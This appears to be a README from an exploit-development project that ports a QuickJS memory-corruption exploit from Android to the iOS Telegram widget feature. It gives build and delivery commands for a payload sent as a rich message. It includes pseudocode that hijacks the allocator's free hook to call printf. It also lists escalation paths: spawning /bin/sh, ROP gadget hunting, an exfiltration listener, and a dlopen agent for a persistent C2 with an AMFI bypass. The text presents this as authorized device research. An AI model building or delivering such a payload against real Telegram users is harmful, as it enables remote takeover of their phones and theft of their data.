# ios_port: iOS Telegram `tgwidget` / QuickJS direct port

Status: 2026-11-05.  Static/host-only preparation; no device operation was
performed by this directory's author.  Main report:
`notes/ios_port_investigation.md`.

## TL;DR

* iOS **13.1.2** has **no** widget sandbox/QuickJS.  The feature is **13.2+**.
* The App Store now ships **13.2** (min iOS 15.0, 6s supported).
* The iOS widget uses the **same quickjs-ng** as Android; the #1827 primitive
  and the ctx chain should port unchanged.
* This directory builds an iOS variant of the Android v7 payload: same
  primitive, iOS endgame = Mach-O base + `printf(marker)` proof through
  `rt->mf.js_free`.  It needs two offsets from the 13.2.0 IPA.

## Quick start (orchestrator, after decrypting 13.2.0)

```sh
cd <HOME>/ailocal/Telegram
VENV=ios_sideload/venv/bin/python

# 1. triage: QuickJS present? BC_VERSION? pre-fix RegExp? allocator stubs?
$VENV lab/ios_port/analyze_bundle.py \
  --ipa ios_sideload/Telegram_13.2.0_decrypted.ipa --stubs

# 2. build the payload + complete widget HTML
#    (add --minify for an ~8.6 KB code block)
$VENV lab/ios_port/make_ios_payload.py \
  --ipa ios_sideload/Telegram_13.2.0_decrypted.ipa --minify

# 3. host checks
node --check lab/ios_port/device_payload_ios_v1.js
node lab/ios_port/test_endgame_node.js

# 4. on the 6s: post device_widget_ios_v1.html as a tgwidget rich message,
#    launch Telegram under DVT --stream, expect IOSPORT_R1827_OK.
```

If `analyze_bundle.py` does not find the widget/QuickJS, **stop**: the build is
not the widget build or the IPA is not decrypted.

## Files

| File | Role |
|---|---|
| `analyze_bundle.py` | IPA/.app/Mach-O triage; QuickJS/RegExp/allocator/stub detector |
| `make_ios_payload.py` | Android v7 payload -> iOS payload + widget HTML |
| `ios_endgame.js` | iOS tail: base, optional `system`, `printf`/`fflush` proof |
| `probe_min.html` | tiny widget: JS execution + tap counter |
| `probe_ctx.html` | read-only engine probe (BigInt, RAB, RegExp, free) |
| `macho_gadgets.py` | arm64 pivot/pop/call candidate finder |
| `test_endgame_node.js` | host mock test of the endgame |
| `host/c2_listener.py` | LAN-only exfil listener |
| `host/frida_probe.js` | ground truth for libc/module/`/bin/sh` |
| `host/ssh_pull.sh` | read-only pull plan (IPA, dyld cache, container, crashes) |
| `ios_commands.md` | pymobiledevice3/trust/DVT/SSH command sheet |
| `device_*_v1.proxy.*` | **proxy build** with macOS 283434 offsets; do not use on iOS |

## What the iOS tail does

```text
js_free = rd64(rt + 16)                # js_def_free in TelegramUIFramework
base    = js_free - CFG.JS_DEF_FREE    # Mach-O image base
printf  = base + CFG.STUB_PRINTF       # imported __stubs entry
wr64(rt+16, printf); wr64(rt+64, D)    # mf.js_free = printf; opaque = marker
TRIG = null                            # synchronous free of a >512 B block
restore js_free/opaque
wr64(rt+16, fflush); wr64(rt+64, 0); BIG = null
restore
```

`js_free_rt` ignores the callee return and computes the free size before the
hook, so `printf(marker)` and `fflush(NULL)` are safe.  The marker lives in the
victim block `D`; `printf` has no format arguments.

Expected on-screen markers (`#iosout`):

```
RT=CTX
VIEWS=…
IOS_HOOK_PRINTF base=0x…
IOS_OK base=0x… proof=0x…
```

and on DVT stdout: `IOSPORT_R1827_OK`.

Failure markers: `NO_VIEWS`, `NO_WR`, `NO_RT`, `NO_FREE`, `IOS_NO_BASE`,
`IOS_NO_PRINTF_STUB`, `IOS_BAD_PROOF_STUB` (the stub offset points at
non-stub code; rebuild or use `--proof-addr`).

## Endgame options

1. `printf` marker (implemented, sandbox-safe).
2. `--system-addr 0x…` (Android shape); only if `/bin/sh` exists and exec is
   allowed.  Rootless Dopamine likely lacks `/bin/sh`; rootful may work.
3. Allocator-hook file/socket stage (`fopen`/`fprintf`, `connect`/`read`/
   `write`); see the report §5.3.
4. ROP from the app `__stubs` (A9, arm64, no PAC); `macho_gadgets.py` finds
   pivots (e.g. 23 `mov sp, x0` candidates in the 13.1.2 UI framework).
5. `dlopen` agent on Dopamine (AMFI bypass) for a persistent C2.

## Safety / rules

* Only test a device you own or are explicitly authorized to test.
* Never send a payload to a third-party bot or chat; use Saved Messages, your
  own test account, or a self-hosted bot.
* No third-party tunnels (localhost.run, ngrok, cloudflared quick tunnels,
  serveo, pinggy, …).  LAN or self-hosted only.
* Keep the original decrypted IPA and the 13.1.2 baseline; rebuild all offsets
  per build.

## Known unknowns

* Exact 13.2.0 build number and whether the stable build keeps the Debug
  Settings toggle.
* Rich-message code-block size limit (the payload is ~21 KB).
* iOS 15.6 `/bin/sh` presence and exec policy.
* iOS heap grooming constants for #1827 (64 MB limit vs Android 6 MiB).
* Main-thread stack size in the shipped 13.2 binary.
